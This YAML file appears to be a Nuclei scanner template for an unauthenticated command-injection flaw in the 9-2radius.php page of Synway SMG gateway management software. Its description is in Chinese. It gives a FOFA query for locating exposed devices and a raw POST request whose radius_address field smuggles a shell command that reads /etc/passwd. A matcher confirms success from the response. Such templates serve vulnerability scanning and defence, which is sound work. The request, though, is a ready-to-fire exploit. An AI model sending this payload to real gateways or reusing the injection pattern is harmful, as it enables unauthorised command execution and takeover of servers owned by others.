id: sanhuiSMG-9-2radius-rce

info:
  name: 三汇SMG网关管理软件 9-2radius.php 存在远程命令执行漏洞
  author: Chenkh
  severity: critical
  description: |
    三汇SMG网关管理软件 9-2radius.php 存在远程命令执行漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
    fofa:body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
  reference:
    - https://mp.weixin.qq.com/s/PyepoFSuQ63E3RnpQa9nsA
  tags: rce,synway,gateway,unauth

http:
  - raw:
      - |
        POST /en/9-2radius.php?authority=6 HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip
        Content-Type: application/x-www-form-urlencoded

        save=1&enable_radius=1&radius_address=/';cat /etc/passwd;+#

    matchers:
      - type: regex
        name: linux
        part: body
        regex:
          - 'root:.*?:[0-9]*:[0-9]*:'
      - type: status
        status:
          - 200
    matchers-condition: and